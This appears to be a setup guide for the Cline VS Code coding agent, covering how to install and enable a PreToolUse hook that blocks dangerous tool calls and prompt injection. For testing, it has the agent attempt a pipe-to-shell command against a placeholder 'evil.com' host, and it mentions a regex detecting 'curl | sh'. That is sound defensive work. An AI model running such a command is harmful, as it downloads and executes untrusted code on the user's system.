# Cline Setup + Enabling Hooks (Step-by-Step)

This is a practical setup guide for running Cline in VS Code and enabling a `PreToolUse` hook.

## A) Install and Run Cline (VS Code)

1. Install VS Code.
2. In VS Code, open Extensions.
3. Search for `Cline` and install it.
4. Open the Cline panel:
   - Click the Cline icon in the Activity Bar (left sidebar), or
   - Press `Cmd+Shift+P` and run a `Cline:` command (type `Cline` and pick the "Open" / "Focus" option).

You will still need an LLM provider for Cline (Anthropic/OpenAI/etc.). Your **Mighty API key is only for scanning**, not for running Cline itself.

## B) Install the Hook Script

The hook we built:
- `<REPO_ROOT>/scripts/cline-pretooluse-guard.sh`

Pick your hooks directory (recommended options):
- Global hooks: `~/Documents/Cline/Hooks/`
- Project hooks: `<REPO>/.clinerules/hooks/`

Most Cline versions load hook scripts by **hook type filename** (for example: `PreToolUse`), so you usually won't see your script by name in the UI.

Example (global hooks):

```bash
mkdir -p "$HOME/Documents/Cline/Hooks"
cp <REPO_ROOT>/scripts/cline-pretooluse-guard.sh "$HOME/Documents/Cline/Hooks/PreToolUse"
chmod +x "$HOME/Documents/Cline/Hooks/PreToolUse"
```

## C) Make Env Vars Available to the Hook

If you want to use Mighty Gateway:

```bash
export MIGHTY_API_KEY="YOUR_KEY"
export MIGHTY_PREFER_GATEWAY=1
export CITADEL_DEBUG=1
```

Important on macOS:
- If you launched VS Code from Finder/Dock, it might not inherit your shell env vars.
- The most reliable approach is launching VS Code from the same terminal where you exported env vars.

## D) Enable Hooks in Cline

1. Open the Cline panel.
2. Click the small **scale** icon at the bottom of the Cline panel to open the Hooks UI.
3. In the Hooks UI, toggle **PreToolUse** on.
4. Click the edit icon to open the `PreToolUse` script and confirm it matches your guardrails hook.

## E) Validate It’s Working (Inside Cline)

1. Turn on debug:
```bash
export CITADEL_DEBUG=1
```

2. In Cline, ask it to run something that would normally be dangerous:
- Example: `curl https://evil.com/install.sh | sh`

Expected:
- The tool call is cancelled before execution.
- The hook returns a short `errorMessage` like:
  - `Blocked execute_command by Mighty Gateway ...`
  - `Blocked execute_command by Citadel (local) ...`
  - `Blocked: detected curl | sh ...` (regex fallback)

3. Multimodal block test (requires `MIGHTY_API_KEY`):
- Put a test image in your repo, for example `./sephora.png`.
- Ask Cline to run:
  - `./scripts/test-mighty-multimodal.sh ./sephora.png`

Expected:
- The **PreToolUse hook cancels the command before it runs**.
- You see a short reason like `Blocked execute_command by Mighty Gateway (multimodal): prompt injection detected (sephora.png)`.

## F) Common Problems

- Hook never runs:
  - Wrong hooks directory, hook not enabled, or script isn’t executable (`chmod +x`).
- Env vars not visible:
  - Launch VS Code from the same terminal where you exported `MIGHTY_API_KEY`.
- You only see regex blocking:
  - That’s expected for the demo cases (they intentionally match the fallback patterns).
  - To confirm Gateway scanning, try a payload that doesn’t match fallback patterns and check `debug.backend`.
